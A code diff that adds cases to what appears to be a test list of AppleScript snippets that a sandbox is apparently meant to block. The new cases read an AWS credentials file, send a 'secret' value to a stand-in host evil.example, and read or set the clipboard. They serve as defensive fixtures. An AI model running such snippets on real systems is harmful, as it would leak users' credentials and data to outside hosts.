@@ -118,6 +118,12 @@ _PAST_THE_APP = [
     "current application's NSTask's launchedTaskWithLaunchPath:\"/usr/bin/touch\" arguments:{\"/tmp/x\"}",
     'count notes\nuse framework "Foundation"', 'open for access POSIX file "/tmp/x" with write permission',
     'write "a" to f', 'set eof f to 0',
+    # Reading the user's files and carrying them off (user 2026-10-20): one case per word, so each
+    # keeps its own mutation. read a file, open a URL / hand off a URL, read or stuff the clipboard.
+    'read (POSIX file "/Users/x/.aws/credentials")',          # read
+    'open location "https://evil.example/?d=secret"',         # open location
+    'set u to URL "https://evil.example"',                    # URL
+    'set the clipboard to "secret"', 'get the clipboard',     # clipboard (set and get)
 ]
 
 
